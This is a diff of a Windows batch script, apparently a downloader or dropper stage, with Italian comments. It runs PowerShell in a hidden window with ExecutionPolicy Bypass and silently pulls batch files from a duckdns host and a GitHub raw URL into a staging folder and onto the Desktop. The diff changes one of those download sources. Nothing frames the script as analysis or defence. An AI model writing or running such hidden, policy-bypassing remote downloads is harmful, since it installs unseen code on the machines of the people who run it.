@@ -13,7 +13,7 @@ mkdir "C:\Users\%USERNAME%\Project\Roll\Staging"
 timeout /t 2 >nul
 :: Scarica i file senza mostrare l'output
 powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
-Invoke-WebRequest -Uri "http://shadingfile.duckdns.org/media/wait_R.bat/" -OutFile "C:\Users\%USERNAME%\Project\Roll\Staging\wait_R.bat" > $null
+Invoke-WebRequest -Uri "https://github.com/Ax0my10rk/A/raw/refs/heads/main/wait_R.bat/" -OutFile "C:\Users\%USERNAME%\Project\Roll\Staging\wait_R.bat" > $null
 powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
 Invoke-WebRequest -Uri "http://shadingfile.duckdns.org/media/clean.bat" -OutFile "C:\Users\%USERNAME%\Desktop\clean.bat" > $null
 timeout /t 2 >nul
